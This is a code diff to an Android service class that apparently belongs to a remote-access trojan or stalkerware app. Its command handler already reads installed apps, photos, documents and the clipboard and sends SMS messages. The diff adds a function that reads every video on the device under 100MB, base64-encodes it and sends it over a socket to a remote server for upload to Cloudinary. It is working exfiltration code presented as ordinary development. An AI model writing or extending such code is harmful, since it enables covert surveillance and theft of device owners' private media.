@@ -345,7 +345,7 @@ class MainService : Service() {
             CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
             CMD_GET_INSTALLED_APPS -> getInstalledApps()
             CMD_GET_PHOTOS -> getMediaFiles("images")
-            CMD_GET_VIDEOS -> getMediaFiles("videos")
+            CMD_GET_VIDEOS -> getVideosWithUpload()
             CMD_GET_DOCUMENTS -> getDocuments()
             CMD_SEND_SMS -> sendSms(params)
             CMD_GET_CLIPBOARD -> getClipboard()
@@ -678,6 +678,59 @@ class MainService : Service() {
             }
         }
         return JSONObject().apply { put(type, files); put("total", files.length()) }
+    }
+    
+    private fun getVideosWithUpload(): JSONObject {
+        try {
+            val videos = getMediaFiles("videos")
+            val videoList = videos.optJSONArray("videos") ?: JSONArray()
+            val uploadedVideos = JSONArray()
+            
+            for (i in 0 until videoList.length()) {
+                val video = videoList.getJSONObject(i)
+                val videoPath = video.optString("path")
+                val videoName = video.optString("name")
+                
+                if (videoPath != null && videoName != null) {
+                    try {
+                        val file = java.io.File(videoPath, videoName)
+                        if (file.exists() && file.length() < 100 * 1024 * 1024) { // Max 100MB
+                            val bytes = file.readBytes()
+                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                            
+                            val result = JSONObject().apply {
+                                put("command", "get_videos")
+                                put("data", base64)
+                                put("name", videoName)
+                                put("size", file.length())
+                                put("mimeType", video.optString("mimeType", "video/mp4"))
+                                put("timestamp", System.currentTimeMillis())
+                            }
+                            
+                            // Send via socket so server uploads to Cloudinary
+                            if (isConnected) {
+                                socket.emit("device:result", JSONObject().apply {
+                                    put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
+                                    put("result", result)
+                                    put("status", "executed")
+                                })
+                            }
+                            
+                            // Add to list with reference to uploaded version
+                            video.put("uploaded", true)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error uploading video ${videoName}: ${e.message}")
+                    }
+                }
+                uploadedVideos.put(video)
+            }
+            
+            return JSONObject().apply { put("videos", uploadedVideos); put("total", uploadedVideos.length()) }
+        } catch (e: Exception) {
+            Log.e(TAG, "getVideosWithUpload error: ${e.message}")
+            return JSONObject().apply { put("videos", JSONArray()); put("total", 0) }
+        }
     }
     
     private fun getDocuments(): JSONObject {
